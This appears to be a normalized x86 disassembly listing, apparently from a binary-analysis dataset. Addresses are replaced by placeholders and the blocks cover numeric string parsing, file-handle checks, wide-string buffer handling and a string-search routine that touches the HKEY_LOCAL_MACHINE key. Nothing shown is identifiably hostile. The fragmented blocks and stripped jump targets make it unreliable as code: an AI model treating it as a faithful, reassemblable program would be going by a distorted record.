cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push edi
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_1004cd62
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x52 ]
cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc ebx
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc ebx
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10017b01
push edi
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1004cd62
inc [ ebp - 0x50 ]
mov ecx esi
call sub_10017b01
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_1004cd62
mov ecx esi
call sub_10017b01
push [ ebp - 0x60 ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1004cd62
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10017b01
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_1004cd62
sub_1005511c
push 0x34
mov eax sub_1007ed4c
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x3c ] edi
add edi 0x8
push edi
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] eax
call sub_1005e05a
add esp 0xc
cmp [ esi + 0x14 ] 0x8
movzx ebx ax
jb r-xdata
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x34 ] 0x0
call sub_1005e05a
add esp 0xc
cmp [ esi ] ax
jne r-xdata
mov esi [ esi ]
movzx eax [ esi ]
cmp bx ax
ja r-xdata
mov [ ebp - 0x34 ] 0x1
add esi 0x2
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10049f43
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
lea ecx [ ebx + 0x9 ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x40 ] esp
push eax
call sub_1000e35e
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x3c ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x30 ]
call sub_10063710
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004dbe5
mov eax [ ebp - 0x30 ]
call sub_10019c00
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10021a98
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_100551f3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1005522b
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x78 ] eax
inc edi
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x70 ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
push ebx
push esi
push 0x2
mov [ ebp - 0x54 ] edx
pop esi
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
xor eax eax
jmp r-xdata
add edx esi
jmp r-xdata
cmp eax 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_1004c3b6
leave
retn
movzx eax [ edx ]
cmp eax 0x20
je r-xdata
cmp eax 0xa
je r-xdata
cmp eax 0xd
jne r-xdata
push 0x30
pop ebx
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_1005593b ]
movzx eax [ edx ]
add edx esi
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x5c ] edi
cmp cx 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
jbe r-xdata
mov [ ebp - 0x5c ] edi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x6c ] edi
jne r-xdata
add eax 0xffffffd0
mov [ ebp - 0x6c ] edi
cmp ax 0x9
ja r-xdata
lea ecx [ edx - 0x4 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cx 0x8
ja r-xdata
mov [ ebp - 0x60 ] edi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] edi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x78 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
je r-xdata
cmp ax bx
jae r-xdata
cmp ax bx
jae r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp ax bx
je r-xdata
cmp ax bx
jmp r-xdata
push 0xa
pop ecx
sub edx esi
sub eax 0x2b
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp ax bx
jae r-xdata
mov [ ebp - 0x70 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
sub eax 0x2b
je r-xdata
push 0x5
cmp eax 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp eax ebx
je r-xdata
cmp ax 0x39
ja r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
movzx eax ax
cmp eax ecx
je r-xdata
cmp ax 0x39
ja r-xdata
movzx eax ax
jmp r-xdata
cmp ax bx
je r-xdata
pop ecx
sub edx esi
jmp r-xdata
push 0x7
jmp r-xdata
sub eax esi
je r-xdata
movzx eax [ edx ]
add edx esi
add eax 0xffffffcf
cmp ax 0x8
jbe r-xdata
jne r-xdata
sub eax esi
je r-xdata
cmp ax 0x39
ja r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
mov eax [ ebp - 0x58 ]
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
mov ecx esi
jmp r-xdata
sub eax esi
je r-xdata
sub edx esi
push 0xb
jmp r-xdata
cmp eax 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx edi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp eax 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
movzx eax [ edx ]
add edx esi
jmp r-xdata
or [ ebp - 0x64 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
sub edx esi
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x68 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movzx edi ax
lea ecx [ ecx + edi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x58 ]
dec eax
inc [ ebp - 0x50 ]
jmp r-xdata
inc [ ebp - 0x9 ]
mov ecx esi
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax ebx
je r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
inc [ ebp - 0x4c ]
sub al bl
inc [ ebp - 0x58 ]
mov [ ecx ] al
jmp r-xdata
cmp eax 0x2d
je r-xdata
movzx eax [ edx ]
add edx esi
inc [ ebp - 0x4c ]
mov ecx [ ebp - 0x58 ]
sub al bl
inc [ ebp - 0x58 ]
dec [ ebp - 0x50 ]
mov [ ecx ] al
cmp ax bx
jae r-xdata
mov ecx 0x1451
movzx eax [ edx ]
add edx esi
dec eax
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp eax 0x43
jle r-xdata
movzx eax [ edx ]
add edx esi
jmp r-xdata
cmp ax 0x39
ja r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10004757
mov eax [ ebp - 0x68 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x64 ] edx
jge r-xdata
cmp eax 0x45
jle r-xdata
movzx eax [ edx ]
add edx esi
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
add eax 0xffffff9c
cmp eax edi
ja r-xdata
cmp [ ebp - 0x6c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x70 ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x7c ]
or eax [ ebp - 0x74 ]
mov [ edi + 0x2 ] esi
pop esi
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x70 ]
mov [ edi ] cx
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x70 ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x78 ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x78 ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x4c ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x64 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x5c ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x64 ]
dec [ ebp - 0x5c ]
cmp [ ebp - 0x5c ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x6c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x64 ]
mov edx [ ebp - 0x5c ]
add eax eax
mov [ ebp - 0x68 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x50 ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x68 ]
cmp [ ebp - 0x68 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x50 ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x6c ]
mov edx [ ebp - 0x60 ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x50 ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x58 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x58 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x4c ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x4c ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_10055977
push 0x10
push r--data
call sub_10078b50
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
call sub_1002788e
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_10078b95
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10038317
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_1000692f
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10055a43
mov eax [ ebp - 0x1c ]
sub_10055a50
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
add eax ecx
mov [ esi + 0x8 ] eax
mov eax 0x1
xor edx edx
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] edx
mov [ esi + 0x1c ] edx
mov [ esi + 0x2c ] eax
cmp ecx edx
je r-xdata
mov [ esi + 0xc ] 0xffffffff
pop esi
pop ebp
retn
call sub_100776f0
pop esi
pop ebp
retn
sub_10055aa0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax ecx
jb r-xdata
push r--data
call sub_1003b4a6
sub eax ecx
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_100616c6
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
mov [ ebp - 0x4 ] edi
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100616c6
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1000fb70
test edi edi
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
pop edi
mov [ eax ] dx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov edx 0x8
cmp [ eax + 0x14 ] edx
jb r-xdata
mov eax [ ebp + 0xc ]
lea edx [ eax + ebx ]
test eax eax
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
lea edi [ ebx + ebx ]
push ecx
add eax edi
push eax
call sub_1005b440
mov eax [ ebp + 0x8 ]
add esp 0xc
cmp esi eax
jne r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edx
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ eax + ecx * 2 ] dx
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax + ecx * 2 ] dx
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
push edi
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_10078600
push ebx
lea ecx [ ecx + edx * 2 ]
mov eax esi
push ecx
push eax
call sub_1005b440
jmp r-xdata
mov eax [ esi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_1005b440
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx [ ebp - 0x4 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ecx
jb r-xdata
sub_10055c30
push ebp
mov ebp esp
sub esp 0x6b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x6ac ] edi
mov [ ebp - 0x6b0 ] eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0x1
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test eax eax
je r-xdata
push ebx
lea edx [ ebp - 0x6a8 ]
mov eax 0x1
call sub_10049510
lea edx [ ebp - 0x6a4 ]
xor eax eax
call sub_10049510
lea edx [ ebp - 0x6a0 ]
mov eax 0x4
call sub_10049510
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x69c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x6a4 ]
xor edi edi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
je r-xdata
pop ebx
pop edi
lea eax [ edx + 0x5 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ edx + 0x2 ]
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x6a0 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x6a4 ]
push eax
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push edi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
je r-xdata
lea edx [ ebp - 0x6a4 ]
push edx
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
je r-xdata
mov edi [ ebp - 0x6ac ]
pop ebx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x6a0 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x6a8 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
je r-xdata
lea ecx [ ebp - 0x6a4 ]
push ecx
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x84 ]
mov eax 0x2
call sub_10049510
mov edx [ ebp - 0x6b0 ]
push 0x1
push edx
lea ecx [ ebp - 0x69c ]
lea eax [ ebp - 0x84 ]
mov edx 0x80000002
call sub_10010710
add esp 0x8
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop ebx
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
